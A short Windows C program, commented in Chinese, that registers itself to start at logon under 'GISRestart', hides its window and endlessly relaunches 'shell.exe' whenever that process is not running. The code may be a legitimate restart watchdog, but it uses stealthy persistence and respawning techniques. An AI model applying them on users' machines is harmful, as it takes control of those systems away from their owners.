#include <windows.h>
//设置当前程序开机启动
#include <tchar.h>
#include <tlhelp32.h>    //进程快照函数头文件
#include <stdio.h>

void AutoPowerOn() {
	HKEY hKey;
	//std::string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//1、找到系统的启动项
	if (RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS,
	                 &hKey) == ERROR_SUCCESS) { ///打开启动项
		//2、得到本程序自身的全路径
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		//3、判断注册表项是否已经存在
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		long result = RegGetValue(hKey, NULL, _T("GISRestart"), RRF_RT_REG_SZ, 0, strDir, &nLength);
		//4、已经存在
		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0) {
			//5、添加一个子Key,并设置值，"GISRestart"是应用程序名字（不加后缀.exe）
			RegSetValueEx(hKey, _T("GISRestart"), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1)*sizeof(TCHAR));
			//6、关闭注册表
			RegCloseKey(hKey);
		}
	}
}


//取消当前程序开机启动
void CanclePowerOn() {
	HKEY hKey;
	//std::string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//1、找到系统的启动项
	if (RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS,
	                 &hKey) == ERROR_SUCCESS) {
		//2、删除值
		RegDeleteValue(hKey, _T("GISRestart"));
		//3、关闭注册表
		RegCloseKey(hKey);
	}
}

void HideWindow() {
	HWND hwnd = GetForegroundWindow();
	if (hwnd) {
		ShowWindow(hwnd, SW_HIDE);
	}
}

bool getProcess(const char *procressName) {              //此函数进程名不区分大小写
	char pName[MAX_PATH];                                //和PROCESSENTRY32结构体中的szExeFile字符数组保持一致，便于比较
	strcpy(pName, procressName);                           //拷贝数组
	CharLowerBuff(pName, MAX_PATH);                       //将名称转换为小写
	PROCESSENTRY32 currentProcess;                        //存放快照进程信息的一个结构体
	currentProcess.dwSize = sizeof(currentProcess);        //在使用这个结构之前，先设置它的大小
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //给系统内的所有进程拍一个快照
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot()调用失败!\n");
		return false;
	}
	bool bMore = Process32First(hProcess, &currentProcess);     //获取第一个进程信息
	while (bMore) {
		CharLowerBuff(currentProcess.szExeFile, MAX_PATH);       //将进程名转换为小写
		if (strcmp(currentProcess.szExeFile, pName) == 0) {       //比较是否存在此进程
			CloseHandle(hProcess);                                //清除hProcess句柄
			return true;
		}
		bMore = Process32Next(hProcess, &currentProcess);         //遍历下一个
	}
	CloseHandle(hProcess);    //清除hProcess句柄
	return false;
}

int main() {
	AutoPowerOn();
	HideWindow();
	while (1) {
		if (!getProcess("shell.exe")) {
			ShellExecuteA(0, "open", "shell.exe", 0, 0, 0);
			ShellExecuteA(0, "open", "shell.exe", 0, 0, 0);
			ShellExecuteA(0, "open", "shell.exe", 0, 0, 0);
		}
	}
}